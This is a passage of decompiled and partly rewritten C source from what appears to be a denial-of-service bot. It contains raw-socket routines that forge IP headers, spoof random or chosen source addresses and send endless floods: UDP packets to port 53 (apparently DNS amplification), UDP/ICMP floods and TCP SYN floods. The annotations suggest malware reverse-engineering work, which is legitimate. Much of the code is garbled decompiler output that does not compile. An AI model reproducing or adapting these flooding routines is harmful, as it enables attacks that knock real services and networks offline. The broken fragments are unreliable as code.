      Vfffff998 = 0;
      memset(packet, 0, 1024);
      while(1) {
	edi = 0;
	if(A24 != 0 && Vfffff998 <= 0) {
	  if ((h = gethostbyname(A28)) != 0) {
L08049288:
	    bcopy( *(*(h->h_addr_list)), iph->saddr, 4);
	    Vfffff998 = 40000;
	  } else {
	    sleep(600);
	    edi = 1;
	  }
	}
	if(edi != 0) {
	  continue;
	}
	edi = 0;
	Vfffff990 = 0;
	do {
	  if(first_iter != 1) {
	    edx = 0;
	  } else {
	    first_iter = 0;
	    edx = random() % 8000; 
	    
	  }
	  if(*(edx * 4 + 0x806d22c) != 0) { // 4th byte of .data + 4*edx
	    dst_pointer = edx * 4 + 0x806d22c; // dest address
	    do {
	      Vfffffddc = *dst_pointer;
	      edx = buffer2 +  Vfffff990; //ebp + Vfffff990 + -536;
	      memmove(datastart, edx, buffer1[edi*4]);
	      // memmove(datastart, edx, *(ebp + edi * 4 - 36));
	      
	      datastart[0] = random() % 255;
	      datastart[1] = random() % 255;
	      
	      if(A1c != 0 || A20 != 0) {
		ax = (A1c << 8) + A20;
	      } else {
		eax = random() % 30000;
	      }
	      udph->uh_sport = htons(ax);
	      udph->uh_dport = 13568; // port 53 --> DNS!!!
	      udph->uh_ulen = htons(*(ebp + edi * 4 - 36) + 8);
	      udph->uh_sum = 0;
	      if(A24 == 0) {
		((char *)&iph->saddr)[0] = A8; // Vfffff9d4 = A8;
		((char *)&iph->saddr)[1] = A8c 
		((char *)&iph->saddr)[2] = A10;
		((char *)&iph->saddr)[3] = A14;
	      }
	      iph->daddr = *dst_pointer; // dest address
	      iph->version = 4;
	      iph->ihl = 5;
	      iph->ttl = (random() % 130) + 120; // TTL
	      iph->id = random() % 255; // identification
	      iph->protocol = 17; // UDP
	      iph->frag_off = 0; //flags and high offset bits
	      iph->tot_len = htons(*(ebp + edi * 4 - 36) + 28); // length
	      iph->check = 0; // checksum 
	      
	      iph->check = in_cksum(iph, 20);

	      sendto(sockfd, packet, buffer1[edi * 4]+28, 0, &sdest, 16);

	      if (A18 != 0) {
		if (group_sent != A18)
		  group_sent++;
		else {
		  precise_sleep(300);
		  group_sent = 0;
		  Vfffff998 = Vfffff998 - 1;
		}
	      }
	      else {
		precise_sleep(300);
		Vfffff998 = Vfffff998 - 1;
	      }

	      dst_pointer++;
	    } while(*Vfffff994 != 0);
	  }
	  Vfffff990 = Vfffff990 + 50;
	  edi = edi + 1;
	} while(edi <= 8);
      }
      goto L08049288;
    }
    active_process = 0;

    return(0);

    /*
    Vfffff9bc = A8;
    Vfffff9b8 = Ac;
    Vfffff9b4 = A10;
    Vfffff9b0 = A14;

    // memcpy(edi, esi, 72);

    edi = & Vffffffdc;
    esi = 0x8067698;
    asm("cld");
    ecx = 9;
    asm("rep movsd");
    Vfffff9ac = 1;

    // memcpy(edi, esi, 1000);

    edi = & Vfffffde8;
    esi = 0x80676bc;
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    esi = & Vfffff9c8;
    Vfffff9a4 = & Vfffff9dc;
    Vfffff9a0 = & Vfffff9e4;
    Vfffffdd8 = 2;
    Vfffffdda = 0;
    if(A18 != 0) {
        A18 = A18 - 1;
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vfffff9a8 = eax;
    if(Vfffff9a8 > 0) {
        Vfffff99c = 0;
        Vfffff998 = 0;
        memset(esi, 0, 1024);
        while(1) {
            edi = 0;
            if(A24 != 0 && Vfffff998 <= 0) {
                edx = gethostbyname(A28);
                if(edx != 0) {
L08049288:
                    bcopy( *( *(edx + 16)), & Vfffff9c4, 4);
                    *(esi + 12) = Vfffff9c4; // source address
                    Vfffff998 = 40000;
                } else {
                    sleep(600);
                    edi = 1;
                }
            }
            if(edi != 0) {
                continue;
            }
            edi = 0;
            Vfffff990 = 0;
            do {
                if(Vfffff9ac != 1) {
                    edx = 0;
                } else {
                    Vfffff9ac = 0;
		    edx = random() % 8000; 

                }
                if(*(edx * 4 + 0x806d22c) != 0) {
                    Vfffff994 = edx * 4 + 0x806d22c;
                    do {
                        Vfffffddc = *Vfffff994;
                        edx = ebp + Vfffff990 + -536;
                        memmove(Vfffff9a0, edx, *(ebp + edi * 4 - 36));

                        *Vfffff9a0 = random() % 255;
                        *(Vfffff9a0 + 1) = random() % 255;

                        if(A1c != 0 || A20 != 0) {
                            ax = (A1c << 8) + A20;
                        } else {
                             eax = random() % 30000;
                        }
                        *Vfffff9a4 = htons(ax);
                        ebx = Vfffff9a4;
                        *(ebx + 2) = 13568;
                        *(ebx + 4) = htons(*(ebp + edi * 4 - 36) + 8);
                        *(ebx + 6) = 0;
                        if(A24 == 0) {
                            Vfffff9d4 = Vfffff9bc;
                            Vfffff9d5 = Vfffff9b8;
                            Vfffff9d6 = Vfffff9b4;
                            Vfffff9d7 = Vfffff9b0;
                        }
                        *(esi + 16) = *Vfffff994; // dest address
                        *esi = 69; // first byte IP header
			*(esi + 8) = (random() % 130) + 120; // TTL
			*(esi + 4) = random() % 255; // identification
                        *(esi + 9) = 17; // UDP
                        *(esi + 6) = 0; //flags and high offset bits
                        *(esi + 2) = htons(*(ebp + edi * 4 - 36) + 28); // length
                        *(esi + 10) = 0; // checksum 

			// checksum calculation ?

                        edx = 20;
                        Vfffff98c = & Vfffff9c8;
                        ecx = 0;
                        Vfffff9c2 = 0;
                        do {
                            ebx = Vfffff98c;
                            ecx = ecx + ( *ebx & 65535);
                            ebx = ebx + 2;
                            Vfffff98c = ebx;
                            edx = edx + -2;
                        } while(edx > 1);
                        != ? 0x804948b : ;
                        Vfffff9c2 = *ebx;
                        ecx = ecx + (Vfffff9c2 & 65535);
                        edx = ecx >> 16;
                        ecx = (cx & 65535) + edx;
                        ax = !(ecx + (ecx >> 16));
                        Vfffff9c2 = ax;
                        *(esi + 10) = Vfffff9c2;
                        sendto(Vfffff9a8, & Vfffff9c8, *(ebp + edi * 4 - 36) + 28, 0, & Vfffffdd8, 16);
                        if(A18 != 0) {
                            if(Vfffff99c != A18) {
                                Vfffff99c = Vfffff99c + 1;
                                goto L0804951a;
                            }
                            precise_sleep(300);
                            Vfffff99c = 0;
                        } else {
                            precise_sleep(300);
                        }
                        Vfffff998 = Vfffff998 - 1;
L0804951a:
                        Vfffff994 = Vfffff994 + 4;
                    } while(*Vfffff994 != 0);
                }
                Vfffff990 = Vfffff990 + 50;
                edi = edi + 1;
            } while(edi <= 8);
        }
        goto L08049288;
    }
    active_process = 0;
    esp = ebp + -1664;
    return(0);
    */

}



//L08049564(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38)
more_udp_stuff(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
/* unknown */ void  A38;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff974;
	/* unknown */ void  Vfffff978;
	/* unknown */ void  Vfffff97c;
	/* unknown */ void  Vfffff980;
	/* unknown */ void  Vfffff984;
	/* unknown */ void  Vfffff988;
	/* unknown */ void  Vfffff98c;
	/* unknown */ void  Vfffff990;
	/* unknown */ void  Vfffff994;
	/* unknown */ void  Vfffff998;
	/* unknown */ void  Vfffff99c;
	/* unknown */ void  Vfffff9a0;
	/* unknown */ void  Vfffff9a4;
	/* unknown */ void  Vfffff9a8;
	/* unknown */ void  Vfffff9ac;
	/* unknown */ void  Vfffff9b2;
	/* unknown */ void  Vfffff9b4;
	/* unknown */ void  Vfffff9b8;
	/* unknown */ void  Vfffff9d8;
	/* unknown */ void  Vfffff9e4;
	/* unknown */ void  Vfffff9e5;
	/* unknown */ void  Vfffff9e6;
	/* unknown */ void  Vfffff9e7;
	/* unknown */ void  Vfffff9e8;
	/* unknown */ void  Vfffff9e9;
	/* unknown */ void  Vfffff9ea;
	/* unknown */ void  Vfffff9eb;
	/* unknown */ void  Vfffff9ec;
	/* unknown */ void  Vfffff9f4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffdda;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde8;
	/* unknown */ void  Vffffffdc;



    Vfffff9ac = A8;
    Vfffff9a8 = Ac;
    Vfffff9a4 = A10;
    Vfffff9a0 = A14;
    Vfffff99c = A18;
    Vfffff998 = A1c;
    Vfffff994 = A20;
    Vfffff990 = A24;

    // memcpy(edi, esi, 9);

    edi = & Vffffffdc;
    esi = 0x8067698;
    asm("cld");
    ecx = 9;
    asm("rep movsd");

    // memcpy(edi, esi, 125);

    edi = & Vfffffde8;
    esi = 0x80676bc;
    asm("cld");
    ecx = 125;
    asm("rep movsd");
    edi = & Vfffff9d8;
    Vfffff988 = & Vfffff9ec;
    Vfffff984 = & Vfffff9f4;
    Vfffffdd8 = 2;
    Vfffffdda = 0;
    if(A34 == 0) {
        sprintf( & Vfffff9b8, "%d.%d.%d.%d", Vfffff9ac & 255, Vfffff9a8 & 255, Vfffff9a4 & 255, Vfffff9a0 & 255);
    }
    if(A28 != 0) {
        A28 = A28 - 1;
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vfffff98c = eax;
    if(Vfffff98c > 0) {
        Vfffff980 = 0;
        Vfffff97c = 0;
        memset(edi, 0, 1024);
        while(1) {
            esi = 0;
            if(A34 != 0 && Vfffff97c <= 0) {
                edx = gethostbyname(A38);
                if(edx != 0) {
L080496cc:
		  bcopy( *( *(edx + 16)), & Vfffff9b4, 4); 
                    eax = Vfffff9b4;
                    *(edi + 16) = eax; // dest address
                    Vfffffddc = *(edi + 16);
                    Vfffff97c = 40000;
                } else {
                    sleep(600);
                    esi = 1;
                }
            }
            if(esi != 0) {
                continue;
            }
            esi = 0;
            Vfffff978 = ebp;
            do {
                if(A34 == 0) {
                    Vfffffddc = inet_addr( & Vfffff9b8);
                }
                memmove(Vfffff984, Vfffff978 + -536, *(ebp + esi * 4 - 36));
                *Vfffff984 = random() % 255;
                *(Vfffff984 + 1) = random() % 255;
                if(A2c != 0 || A30 != 0) {
                    ax = (A2c << 8) + A30;
                } else {
		    eax = random() % 30000;
                }
                *Vfffff988 = htons(ax);
                ebx = Vfffff988;
                *(ebx + 2) = 13568;
                *(ebx + 4) = htons(*(ebp + esi * 4 - 36) + 8);
                *(ebx + 6) = 0;
                if(Vfffff99c != 0 || Vfffff998 != 0 || Vfffff994 != 0 || Vfffff990 != 0) {
                    Vfffff9e4 = Vfffff99c;
                    Vfffff9e5 = Vfffff998;
                    Vfffff9e6 = Vfffff994;
                    Vfffff9e7 = Vfffff990;
                } else {
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e4 = dl + al;
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e5 = dl + al;
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e6 = dl + al;
                    random();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e7 = dl + al;
                }
                if(A34 == 0) {
                    Vfffff9e8 = Vfffff9ac;
                    Vfffff9e9 = Vfffff9a8;
                    Vfffff9ea = Vfffff9a4;
                    Vfffff9eb = Vfffff9a0;
                }
                *edi = 69; // IP version and HL
		*(edi + 8) = (random() % 130) + 120; // TTL
		*(edi + 4) = random() % 255; // id
                *(edi + 9) = 17; // protocol: UDP
                *(edi + 6) = 0;  // flags and frag offset
                *(edi + 2) = htons(*(ebp + esi * 4 - 36) + 28); // total length
                *(edi + 10) = 0; // checksum

		// checksum calculation

                edx = 20;
                Vfffff974 = & Vfffff9d8;
                ecx = 0;
                Vfffff9b2 = 0;
                do {
                    ebx = Vfffff974;
                    ecx = ecx + ( *ebx & 65535);
                    ebx = ebx + 2;
                    Vfffff974 = ebx;
                    edx = edx + -2;
                } while(edx > 1);
                != ? 0x8049933 : ;
                Vfffff9b2 = *ebx;
                ecx = ecx + (Vfffff9b2 & 65535);
                edx = ecx >> 16;
                ecx = (cx & 65535) + edx;
                ax = !(ecx + (ecx >> 16));
                Vfffff9b2 = ax;
                *(edi + 10) = Vfffff9b2;
                sendto(Vfffff98c, & Vfffff9d8, *(ebp + esi * 4 - 36) + 28, 0, & Vfffffdd8, 16);
                if(A28 != 0) {
                    if(Vfffff980 != A28) {
                        Vfffff980 = Vfffff980 + 1;
                        goto L080499c2;
                    }
                    precise_sleep(300);
                    Vfffff980 = 0;
                } else {
                    precise_sleep(300);
                }
                Vfffff97c = Vfffff97c - 1;
L080499c2:
                Vfffff978 = Vfffff978 + 50;
                esi = esi + 1;
            } while(esi <= 8);
        }
        goto L080496cc;
    }
    active_process = 0;
    esp = ebp + -1688;
    return(0);
}



//L080499F4(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34)
send_udp_or_icmp(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34)
/* unknown */ void  A8; // flag: =0 icmp, >0 udp
/* unknown */ void  Ac; // udp dest port
/* unknown */ void  A10; // 1st byte ip dest addr
/* unknown */ void  A14; // 2nd
/* unknown */ void  A18; // 3rd
/* unknown */ void  A1c; // 4th
/* unknown */ void  A20; // 1st byte ip source addr
/* unknown */ void  A24; // 2nd
/* unknown */ void  A28; // 3rd
/* unknown */ void  A2c; // 4th
/* unknown */ void  A30; // flag whether to use dest addr (used if 0)
/* unknown */ void  A34; // string containing dest addr if A30 != 0
                         //  format: "%d.%d.%d.%d"
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff60;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff6c;
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vffffff74;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vffffff7c;
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vffffff84;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffff8e;
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd6;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffd9;
	/* unknown */ void  Vffffffda;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe5;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;


	/*
    Vffffff84 = A10; // 1st
    Vffffff80 = A14; // 2nd
    Vffffff7c = A18; // 3rd
    Vffffff78 = A1c; // 4th byte oip address  
    Vffffff74 = A20; // 1st byte ip address
    Vffffff70 = A24; // 2nd byte ip address
    Vffffff6c = A28; // 3rd byte ip address
	*/

    char packet[?];

    struct sockaddr_in sdest;

    char *iph = packet;
    char *udph = packet + 20;
    char *icmph = packet + 20;
    char * datastart;

    sdest.sin_family = 2; // AF_INET
    sdest.sin_port = htons(random() % 255);

    /*
    Vfffffff0 = 2;

    Vfffffff2 = htons(random() % 255);
    */

    char src_addr_str[4];
    char dest_addr_str[4];
    in_addr_t real_dest;

    sprintf(src_addr_str, "%d.%d.%d.%d", A20, A24, A28, A2c);
    if (A30 == 0) {
      sprintf(dest_addr_str, "%d.%d.%d.%d", A10, A14, A18, A1c);
      sdest.sin_addr.s_addr = inet_add(dest_addr_str);
    }

    /*
    esi = & Vffffff90;
    sprintf(esi, "%d.%d.%d.%d", Vffffff74 & 255, Vffffff70 & 255, Vffffff6c & 255, A2c & 255);
    if(A30 == 0) {
        ebx = & Vffffffb0;
        sprintf(ebx, "%d.%d.%d.%d", Vffffff84 & 255, Vffffff80 & 255, Vffffff7c & 255, Vffffff78 & 255);
        Vfffffff4 = inet_addr(ebx);
    }
    */

    if ((sockfd = socket(AF_INET, SOCK_RAW, RAW)) > 0) {

      iph->version = 4;
      iph->ihl = 5;
      iph->tot_len = 7208;
      iph->id = 21764;
      iph->ttl = (random() % 130) + 120;
      iph->saddr = inet_addr(src_addr_str);
      if (A30 == 0)
	iph->daddr = inet_addr(dest_addr_str);
      iph->check = 0;
      if (A8 != 0) {
	iph->protocol = 17; // UDP
	udph->source = htons(random() + 255);
	udph->dest = htons(Ac);
	udph->len = 2304; // 9 bytes
	udph->check = 0;
	udph->check = in_cksum(udph, 9);  // should be 8
	datastart = packet + 28;
	datastart[0] = 97; // only one byte of data
      }
      else {
	iph->protocol = 1; // ICMP
	icmph->type = ICMP_ECHO;
	icmph->code = 0;
	icmph->checksum = 0;
	icmph->checksum = in_cksum(icmph, 9); // should be 8
	                                      //id and seq number are missing
      }

      length = 29;

      iph->check = in_cksum(iph, 20);
      
    

      /*
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffff68 = eax;
    if(Vffffff68 > 0) {
        Vffffffd0 = 69; // IP version and HL
        Vffffffd2 = 7208; // total length
        Vffffffd4 = 21764; // id

	Vffffffd8 = (random() % 130) + 120; // TTL
        Vffffffdc = inet_addr(esi); // source address
        if(A30 == 0) {
	  Vffffffe0 = inet_addr( & Vffffffb0); // dest address
        }
        Vffffffd6 = 65055; // flags: all set and 0x1e1f offset
        Vffffffda = 0; // checksum
        if(A8 != 0) {
	    Vffffffd9 = 17; // protocol: udp
            Vffffffe4 = htons(random() + 255); // UDP header: source port
            Vffffffe6 = htons(Ac); // dest port
            Vffffffe8 = 2304; // udp length

	    // udp checksum calculation

            edx = 9;
            esi = & Vffffffe4;
            ebx = 0;
            Vffffff8e = 0; 
            do {
                ebx = ebx + ( *esi & 65535);
                esi = esi + 2;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x8049b89 : ;
            Vffffff8e = *esi;
            ebx = ebx + (Vffffff8e & 65535);
            edx = ebx >> 16;
            ebx = (bx & 65535) + edx;
            ebx = ebx + (ebx >> 16);
            ax = !ebx;
            Vffffff8e = ax;
            Vffffffea = Vffffff8e; // set checksum
            Vffffffec = 97; // data?
        } else {
	  Vffffffd9 = 1; // protocol: icmp
	  Vffffffe4 = 8; // type: source host isolated (obsolete)
	  Vffffffe5 = 0; // code
	  Vffffffe6 = 0; // checksum

	    //  icmp checksum calculation

            edx = 9;
            esi = & Vffffffe4;
            ebx = 0;
            Vffffff8e = 0;
            do {
                ebx = ebx + ( *esi & 65535);
                esi = esi + 2;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x8049bf1 : ;
            Vffffff8e = *esi;
            ebx = ebx + (Vffffff8e & 65535);
            edx = ebx >> 16;
            ebx = (bx & 65535) + edx;
            ebx = ebx + (ebx >> 16);
            ax = !ebx;
            Vffffff8e = ax;
            Vffffffe6 = Vffffff8e;
        }
        Vffffff64 = 29;

	// IP checksum calculation

        edx = 20;
        esi = & Vffffffd0;
        ebx = 0;
        Vffffff8e = 0;
        do {
            ebx = ebx + ( *esi & 65535);
            esi = esi + 2;
            edx = edx + -2;
        } while(edx > 1);
        != ? 0x8049c49 : ;
        Vffffff8e = *esi;
        ebx = ebx + (Vffffff8e & 65535);
        edx = ebx >> 16;
        Vffffff8e = !(ebx + ((bx & 65535) + edx >> 16));
        Vffffffda = Vffffff8e; // set checksum
    */

    
      ebx = 0;
      for(; 1; ebx = ebx - 1) {
	esi = 0;
	if(A30 != 0 && ebx <= 0) {
	  if((h = gethostbyname(A34)) != 0) {
L08049cac:
	    bcopy( *( h->h_addr_list), &real_dest, 4);
	    sdest.sin_addr.s_addr = real_dest;
	    ebx = 40000;
	  } else {
	    sleep(600);
	    esi = 1;
	  }
	}
	if(esi == 0) {
	  sendto(sockfd, packet, length, 0, sdest, 16);
	  sendto(sockfd, packet, length, 0, sdest, 16);
	  precise_sleep(20);
	}
      }
      goto L08049cac;
    }

    /*
        ebx = 0;
        Vffffff60 = & Vfffffff0;
        for(edi = & Vffffffd0; 1; ebx = ebx - 1) {
            esi = 0;
            if(A30 != 0 && ebx <= 0) {
                edx = gethostbyname(A34);
                if(edx != 0) {
L08049cac:
                    bcopy( *( *(edx + 16)), & Vffffff88, 4);
                    eax = Vffffff88;
                    Vffffffe0 = eax; // dest address
                    Vfffffff4 = Vffffffe0;
                    ebx = 40000;
                } else {
                    sleep(600);
                    esi = 1;
                }
            }
            if(esi == 0) {
                sendto();
                sendto(Vffffff68, edi, Vffffff64, 0, Vffffff60, 16, Vffffff68, edi, Vffffff64, 0, Vffffff60, 16);
                precise_sleep(20);
            }
        }
        goto L08049cac;
    }
    */


    active_process = 0;
    esp = ebp + -172;
    return(0);
}



//L08049D40(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38, A3c)
send_tcp(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38, A3c)
/* unknown */ void  A8;  // 1st byte dst ip addr
/* unknown */ void  Ac;  // 2nd
/* unknown */ void  A10; // 3rd
/* unknown */ void  A14; // 4th
/* unknown */ void  A18; // high byte tcp dst port
/* unknown */ void  A1c; // low byte tcp dst port
/* unknown */ void  A20; // flag whether to generate random source addr (=0)
/* unknown */ void  A24; // 1st byte src ip addr
/* unknown */ void  A28; // 2nd
/* unknown */ void  A2c; // 3rd
/* unknown */ void  A30; // 4th
/* unknown */ void  A34;
/* unknown */ void  A38; // flag if dest addr is used (=0)
/* unknown */ void  A3c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff34;
	/* unknown */ void  Vffffff38;
	/* unknown */ void  Vffffff3c;
	/* unknown */ void  Vffffff40;
	/* unknown */ void  Vffffff44;
	/* unknown */ void  Vffffff48;
	/* unknown */ void  Vffffff4c;
	/* unknown */ void  Vffffff50;
	/* unknown */ void  Vffffff54;
	/* unknown */ void  Vffffff58;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffff62;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb1;
	/* unknown */ void  Vffffffb2;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffc9;
	/* unknown */ void  Vffffffca;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd1;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffde;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffe9;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vffffffee;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    Vffffff5c = A8;  // 1st byte dst addr
    Vffffff58 = Ac;  // 2nd
    Vffffff54 = A10; // 3rd
    Vffffff38 = A14; // 4th
    Vffffff50 = A24; // 1st byte src addr
    Vffffff4c = A28; // 2nd
    Vffffff48 = A2c; // 3rd
    Vffffff44 = A30; // 4th

    if(A34 != 0) {
        A34 = A34 - 1;
    }
    srand(time(0));

    char dest_addr_str[4];
    char *packet[?];
    char *iph = packet;
    char *tcph = packet + 20;
    char *datastart = packet + 40;

    sdest.sin_family = 2; // AF_INET
    sdest.sin_port = htons(random() % 255);

    if (A38 == 0) {
      sprintf(dest_addr_str, "%d.%d.%d.%d", A8, Ac, A10, A14);
      sdest.sin_addr.s_addr = inet_addr(dest_addr_str);
    }

    /*
    Vfffffff0 = 2;
    Vfffffff2 = htons(random() % 255);
    if(A38 == 0) {
        ebx = & Vffffff88;
        sprintf(ebx, "%d.%d.%d.%d", Vffffff5c & 255, Vffffff58 & 255, Vffffff54 & 255, Vffffff38 & 255);
        Vfffffff4 = inet_addr(ebx);
    }
    */

    iph->version = 4;
    iph->ihl = 5;
    iph->tot_len = 10240;
    iph->tos = 0;

    if ((sockfd = socket(AF_INET, SOCK_RAW, RAW)) > 0) {
      if (A20 != 0)
	sprintf( src_addr_str, "%d.%d.%d.%d", A24, A28, A2c, A30);
      if(A38 == 0)
	iph->daddr = inet_addr(dst_addr_str); // dest ip
      iph->frag_off = 0;
      iph-> protocol = 6; // TCP
      tcph->fin = 0; // clear lower 4 bits
      tcph->syn = 0; // clear lower 4 bits
      tcph->rst = 0; // clear lower 4 bits
      tcph->psh = 0; // clear lower 4 bits
      tcph->doff = 5;
      tcph->ack_seq = 0;
      tcph->syn = 1;
      tcph->urg_ptr = 0;
      tcph->dest = htons((A18 << 8) + A1c);


      /*
    Vffffffc8 = 69; // ip version and HL
    Vffffffca = 10240; // total length; note this is almost the reverse byte order as in previous function
    Vffffffc9 = 0; // tos
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffff40 = eax;
    if(Vffffff40 > 0) {
        if(A20 != 0) {
            sprintf( & Vffffff68, "%d.%d.%d.%d", Vffffff50 & 255, Vffffff4c & 255, Vffffff48 & 255, Vffffff44 & 255);
        }
        if(A38 == 0) {
	  Vffffffd8 = inet_addr( & Vffffff88); // dest ip
        }
        Vffffffce = 0; // flags and offset
        Vffffffd1 = 6; // protocol: TCP
        Vffffffe9 = Vffffffe9 & 239; 
        al = Vffffffe8 & 15 | 80;
        Vffffffe8 = al; // header length
        Vffffffe4 = 0; // ack
        Vffffffe8 = Vffffffe8 & 80; // header length, again
        Vffffffe9 = 2; // flags, again
        Vffffffee = 0; // urg pointer
        Vffffffde = htons((A18 << 8) + A1c); // tcp dest port
      */
        edi = 0;
        Vffffffb0 = 0;
        if(A38 == 0) {
            Vffffffac = Vffffffd8;
        }
        Vffffffb1 = 6;
        Vffffffb2 = 5120;
        esi = 0;
        for(Vffffff3c = & Vffffffa8; 1; esi = esi - 1) {
            Vffffff34 = 0;
            if(A38 != 0 && esi <= 0) {

	      if ((h = gethostbyname(A3c)) != 0) {
L08049f30:
		bcopy( *(h->h_addr_list), &real_dest, 4);
		iph->daddr = real_dest;
		sdest.sin_addr.s_addr = real_dest;
		esi = 40000;
	      }
	      else {
		sleep(600);
		Vffffff34 = 1;
	      }

	      /*
	        edx = gethostbyname(A3c);
                if(edx != 0) {
L08049f30:
		  bcopy( *( *(edx + 16)), & Vffffff64, 4); 
		  eax = Vffffff64;
		  Vffffffd8 = eax;  // dest ip
		  Vfffffff4 = eax;
		  Vffffffac = Vfffffff4;
		  esi = 40000;
                } else {
                    sleep(600);
                    Vffffff34 = 1;
                }
	      */

            }
            if(Vffffff34 != 0) {
                continue;
            }

	    iph->id = htons((rand() % 3089) + 2);
	    tcph->window = htons((rand() % 1401) + 200);
	    tcph->source = htons((rand() % 4000) + 1);
	    tcph->seq = htonl((rand() % 40000000) + 1);
	    iph->ttl = (rand() % 116) + 125;
	    if (A20 == 0)
	      sprintf(src_addr_str, "%u.%u.%u.%u", (random() % 255),
		      (random() % 255), (random() % 255), (random() % 255));

	    iph->source = inet_addr(src_addr_str);
            Vffffffa8 = iph->source; // ?? no clue
	    tcph->check = 0;
	    iph->check = 0;

	    tcph->check = tcp_checksum; // ok, I'm too lazy to do all this

	    iph->check = in_cksum(iph, 20);

	    /*
            Vffffffcc = htons((rand() % 3089) + 2); // ip id
            Vffffffea = htons((rand() % 1401) + 200); // tcp window size
            Vffffffdc = htons((rand() % 4000) + 1); // tcp source port
            Vffffffe0 = htonl((rand() % 40000000) + 1); // tcp sequence no. 
	    Vffffffd0 = (rand() % 116) + 125; // ip ttl
            if(A20 == 0) {
		sprintf(& Vffffff68, "%u.%u.%u.%u", (random() % 255),
			(random() % 255), (random() % 255), (random() % 255));

                esp = esp + 24;
            }
	    eax = inet_addr(& Vffffff68);
            Vffffffd4 = eax; // source address
            Vffffffa8 = Vffffffd4;
            Vffffffec = 0; // tcp checksum
            Vffffffd2 = 0; // ip checksum

	    // tcp checksum calculation

            bcopy(& Vffffffdc, & Vffffffb4, 20);
            esp = esp + 16;
            edx = 32;
            Vffffff34 = Vffffff3c;
            ecx = 0;
            Vffffff62 = 0;
            do {
                ebx = Vffffff34;
                ecx = ecx + ( *ebx & 65535);
                ebx = ebx + 2;
                Vffffff34 = ebx;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x804a097 : ;
            Vffffff62 = *ebx;
            ecx = ecx + (Vffffff62 & 65535);
            edx = ecx >> 16;
            Vffffff62 = !(ecx + ((cx & 65535) + edx >> 16));
            Vffffffec = Vffffff62;

	    // ip checksum calculation

            edx = 20;
            Vffffff34 = & Vffffffc8;
            ecx = 0;
            Vffffff62 = 0;
            do {
                ebx = Vffffff34;
                ecx = ecx + ( *ebx & 65535);
                ebx = ebx + 2;
                Vffffff34 = ebx;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x804a103 : ;
            Vffffff62 = *ebx;
            ecx = ecx + (Vffffff62 & 65535);
            edx = ecx >> 16;
            ecx = (cx & 65535) + edx;
            ax = !(ecx + (ecx >> 16));
            Vffffff62 = ax;
            Vffffffd2 = Vffffff62;
	    */

            sendto(sockfd, packet, 40, 0, &sdest, 16);

